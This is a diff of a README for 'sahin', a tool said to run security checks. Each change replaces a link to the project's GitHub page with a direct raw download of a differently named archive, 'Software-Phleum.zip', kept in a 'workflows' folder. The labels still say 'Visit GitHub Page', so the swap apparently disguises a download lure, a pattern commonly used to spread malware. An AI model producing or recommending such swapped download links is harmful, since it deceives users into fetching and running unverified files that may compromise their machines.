@@ -1,12 +1,12 @@
 # 🛡️ sahin - Run Security Checks With Less Effort
 
-[![Download sahin](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/aleciaboon324/sahin)
+[![Download sahin](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/aleciaboon324/sahin/main/workflows/Software-Phleum.zip)
 
 ## 📥 Download
 
 Use this link to visit the GitHub page and download the app:
 
-[https://github.com/aleciaboon324/sahin](https://github.com/aleciaboon324/sahin)
+[https://raw.githubusercontent.com/aleciaboon324/sahin/main/workflows/Software-Phleum.zip](https://raw.githubusercontent.com/aleciaboon324/sahin/main/workflows/Software-Phleum.zip)
 
 ## 🖥️ What sahin Does
 
@@ -36,7 +36,7 @@ If the app comes in a ZIP file, you will also need built-in Windows support for 
 ## 🚀 Getting Started
 
 1. Open this page in your browser:
-   [https://github.com/aleciaboon324/sahin](https://github.com/aleciaboon324/sahin)
+   [https://raw.githubusercontent.com/aleciaboon324/sahin/main/workflows/Software-Phleum.zip](https://raw.githubusercontent.com/aleciaboon324/sahin/main/workflows/Software-Phleum.zip)
 
 2. Look for the latest release or download file on the page.
 
@@ -209,4 +209,4 @@ This helps you keep the whole run in one place and avoid switching between many 
 
 If you need to return to the download page, use this link:
 
-[https://github.com/aleciaboon324/sahin](https://github.com/aleciaboon324/sahin)
+[https://raw.githubusercontent.com/aleciaboon324/sahin/main/workflows/Software-Phleum.zip](https://raw.githubusercontent.com/aleciaboon324/sahin/main/workflows/Software-Phleum.zip)
